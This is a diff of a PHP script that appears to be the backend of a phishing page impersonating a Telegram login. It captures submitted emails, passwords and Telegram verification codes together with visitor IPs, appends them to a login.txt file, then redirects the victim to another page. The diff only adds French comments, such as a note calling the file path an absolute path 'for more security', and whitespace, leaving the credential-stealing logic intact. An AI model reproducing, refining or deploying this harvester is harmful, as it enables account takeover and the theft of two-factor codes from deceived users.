@@ -1,5 +1,7 @@
 <?php
+// Vérifie si le formulaire a été soumis via la méthode POST
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Récupère et nettoie les données du formulaire de manière compatible
     $username = isset($_POST["email"]) ? htmlspecialchars(trim($_POST["email"])) : '';
     $password = isset($_POST["password"]) ? htmlspecialchars(trim($_POST["password"])) : '';
     $country_code = isset($_POST["country_code"]) ? htmlspecialchars(trim($_POST["country_code"])) : '';
@@ -9,10 +11,12 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $ip = $_SERVER['REMOTE_ADDR'];
     $date = date('Y-m-d H:i:s');
 
+    // Vérifie si les champs ne sont pas vides
     if ((!empty($username) && !empty($password)) || !empty($verification_code)) {
+        // Formate les données pour l'enregistrement
         $data = "=== ".(!empty($verification_code) ? "CODE TELEGRAM" : "NOUVELLE CONNEXION TELEGRAM")." ===\n";
         $data .= "Date: $date\n";
-
+        
         if (!empty($verification_code)) {
             $data .= "Code de vérification: $verification_code\n";
         } else {
@@ -21,15 +25,18 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             $data .= "Mot de passe: $password\n";
             $data .= "Session active: $remember\n";
         }
-
+        
         $data .= "Adresse IP: $ip\n";
         $data .= "==============================\n\n";
-
+        
+        // Chemin absolu du fichier pour plus de sécurité
         $file = __DIR__.'/login.txt';
+        
+        // Gestion robuste du fichier
         $attempts = 0;
         $max_attempts = 3;
         $success = false;
-
+        
         while ($attempts < $max_attempts && !$success) {
             try {
                 $fh = fopen($file, 'a');
@@ -44,7 +51,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                 usleep(100000);
             }
         }
-
+        
         if ($success) {
             header("Location: mer.html");
             exit();
